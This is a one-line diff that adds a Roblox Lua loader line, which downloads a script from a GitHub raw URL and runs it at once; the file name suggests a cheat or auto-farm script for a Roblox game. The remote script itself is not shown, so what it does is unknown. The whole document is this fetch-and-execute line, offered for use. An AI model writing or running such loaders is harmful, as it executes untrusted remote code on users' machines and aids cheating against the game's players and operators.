@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/drill-to-earth-s-core-spam6-x0n3d93igq1v5j.lua"))()
